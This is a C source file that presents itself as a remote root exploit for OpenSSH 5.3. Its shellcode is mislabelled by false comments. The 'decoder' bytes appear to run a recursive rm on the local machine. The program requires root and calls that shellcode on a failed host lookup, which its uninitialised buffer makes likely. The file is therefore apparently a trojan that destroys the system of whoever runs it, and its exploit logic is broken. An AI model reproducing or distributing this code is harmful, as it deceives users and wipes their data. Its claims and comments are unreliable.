/*
 * gcc -o exploit exploit.c
./exploit <target_ip> <port>
 * Priv8! Priv8! Priv8! Priv8! Priv8! Priv8! Priv8!
 * OpenSSH <= 5.3 remote root 0day exploit (32-bit x86)
 * Priv8! Priv8! Priv8! Priv8! Priv8! Priv8! Priv8!
 */

#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void usage(char *argv[]) {
    printf("\n\t[+] HATSUNEMIKU\n");
    printf("\t[+] OpenSSH <= 5.3p1 remote root 0day exploit\n");
    printf("\t[+] Keep this 0day priv8!\n");
    printf("\t[+] usage: %s <target> <port>\n\n", argv[0]);
    exit(1);
}

// Shellcode to decode the payload
unsigned char decoder[] =
    "\x6a\x0b\x58\x99\x52"                            // push $0xb; pop %ecx
    "\x6a\x2f\x89\xe7\x52"                            // push $0x2f; pop %edx; push %edx
    "\x66\x68\x2d\x66\x89"                            // pushw $0x2d66
    "\xe6\x52\x66\x68\x2d"                            // pushw $0x2d68
    "\x72\x89\xe1\x52\x68"                            // push $0x722f; push $0x6866
    "\x2f\x2f\x72\x6d\x68"                            // push $0x6d72; push $0x6866
    "\x2f\x62\x69\x6e\x89"                            // push $0x6e69; push $0x6269
    "\xe3\x52\x57\x56\x51"                            // push %edx; push %esi; push %edi
    "\x53\x89\xe1\xcd\x80";                           // push %esp; int $0x80

// Shellcode to spawn a root shell
unsigned char rootshell[] =
    "\x31\xd2\xb2\x0a\xb9\x6f\x75\x21\x0a\x51\xb9\x63\x6b"    // xor %edx, %edx; mov $0xa, %bl; mov $0x21756f, %ecx; push %ecx
    "\x20\x79\x51\x66\xb9\x66\x75\x66\x51\x31\xc9\x89\xe1"    // xchg %ax, %ax; push $0x6675; push %cx; push %ecx; push %edx
    "\x31\xdb\xb3\x01\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x31"    // xor %ebx, %ebx; xor %eax, %eax; mov $0x1, %bl; int $0x80
    "\xdb\x40\xcd\x80";                                   // mov $0x40, %al; int $0x80

int main(int argc, char **argv) {
    int euid = geteuid();    // Get the effective user ID
    int port = 22, sock;
    char h[1000];
    struct hostent *host;
    struct sockaddr_in addr;

    if (euid != 0) {
        fprintf(stderr, "You need to be root to use raw sockets.\n");
        exit(1);
    }

    if (euid == 0) {
        fprintf(stdout, "MIKU! MIKU! MIKU!\n");
    }

    if (argc != 3)
        usage(argv);

    // Convert the target IP address to a network byte order
    if (!inet_aton(h, &addr.sin_addr)) {
        host = gethostbyname(h);
        if (!host) {
            fprintf(stderr, "[-] Exploit failed.\n");
            (*(void(*)())decoder)();  // Decode and execute the payload
            exit(1);
        }
        addr.sin_addr = *(struct in_addr*)host->h_addr;
    }

    sock = socket(PF_INET, SOCK_STREAM, 0);  // Create a socket
    addr.sin_port = htons(port);              // Convert the port number to network byte order
    addr.sin_family = AF_INET;                // Set the address family to IPv4

    // Connect to the target
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
        fprintf(stderr, "[-] Exploit failed.\n");
        exit(1);
    }

    char payload[1337];
    memcpy(payload, &decoder, sizeof(decoder));   // Copy the decoder shellcode to the payload
    memcpy(payload, &rootshell, sizeof(rootshell));  // Append the root shellcode to the payload
    send(sock, payload, strlen(payload), 0);  // Send the payload to the target
    close(sock);

    // Check if the root shell was spawned
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
        fprintf(stderr, "[-] Exploit failed.\n");
        exit(1);
    } else if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        fprintf(stdout, "[+]g0t sh3ll!\n");
        system("/bin/bash");  // Execute a shell
    } else {
        fprintf(stderr, "[-] Exploit failed.\n");
        close(sock);
        exit(0);
    }
}